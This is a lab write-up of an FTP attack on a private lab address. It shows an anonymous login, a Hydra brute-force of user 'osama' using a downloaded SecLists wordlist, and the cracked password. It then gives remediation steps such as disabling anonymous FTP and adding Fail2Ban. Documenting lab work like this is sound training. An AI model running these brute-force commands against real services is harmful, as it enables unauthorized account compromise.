# FTP Enumeration & Brute Force Attack

**Author:** Farouq Hassan
**Target IP:** `192.168.169.134`
**Attack Type:** FTP Enumeration + Password Brute Force
**Environment:** Controlled Lab

📄 Source: 

---

# Objective

1. Identify exposed services
2. Confirm anonymous FTP access
3. Perform password brute-force attack against known user `osama`
4. Obtain valid FTP credentials

---

# Step 1 — Identify FTP Service

The target system exposed FTP service.

Confirmed service:

```bash
ftp 192.168.169.134
```

The FTP service was accessible.

---

# Step 2 — Test Anonymous FTP Access

Attempted login using anonymous credentials:

```bash
ftp 192.168.169.134
```

When prompted:

```text
Name: anonymous
Password: anonymous
```

Result:

* Anonymous access was allowed.
* FTP server permitted unauthenticated access.

This indicates weak FTP configuration.

---

# Step 3 — Identify Valid Username

The username `osama` was identified as a valid account on the system.

Next objective:
Brute-force the password for user `osama`.

---

# Step 4 — Download Password Wordlist

Used `wget` to download a common password list from SecLists.

Command executed:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
```

File downloaded:

```bash
100k-most-used-passwords-NCSC.txt
```

This file contains 100,000 commonly used passwords.

---

# Step 5 — Perform FTP Brute Force with Hydra

Used `hydra` to brute-force FTP credentials.

Command executed:

```bash
hydra -l osama -P 100k-most-used-passwords-NCSC.txt ftp://192.168.169.134
```

### Command Breakdown

* `-l osama` → specifies the username
* `-P 100k-most-used-passwords-NCSC.txt` → password wordlist
* `ftp://192.168.169.134` → target FTP service

Hydra attempted authentication using each password in the list.

---

# Step 6 — Successful Credential Discovery

Hydra returned valid credentials:

```text
login: osama
password: scorpio
```

Authentication was successful.

Confirmed by logging in manually:

```bash
ftp 192.168.169.134
```

Then entering:

```text
Name: osama
Password: scorpio
```

Access granted.

---

# Result

Valid FTP credentials obtained:

```text
Username: osama
Password: scorpio
```

Attack successful.

(Confirmed in submission )

---

# Security Issues Identified

1. Anonymous FTP access enabled
2. Weak password policy
3. No rate limiting on FTP authentication
4. No account lockout mechanism
5. Service exposed to network without restrictions

---

# Security Recommendations

## 1. Disable Anonymous FTP

Update FTP configuration:

```bash
anonymous_enable=NO
```

Restart FTP service afterward.

---

## 2. Enforce Strong Password Policy

Require:

* Minimum 12 characters
* Uppercase and lowercase
* Numbers
* Symbols

---

## 3. Implement Fail2Ban

Install:

```bash
sudo apt install fail2ban
```

Configure FTP jail to prevent brute-force attacks.

---

## 4. Restrict FTP Exposure

* Use firewall rules
* Allow only internal IP ranges
* Consider replacing FTP with SFTP

---

# Final Outcome

This lab demonstrates:

* Service enumeration
* Anonymous FTP misconfiguration
* Wordlist acquisition
* Credential brute-forcing using Hydra
* Successful authentication compromise


Just tell me how you want it structured.
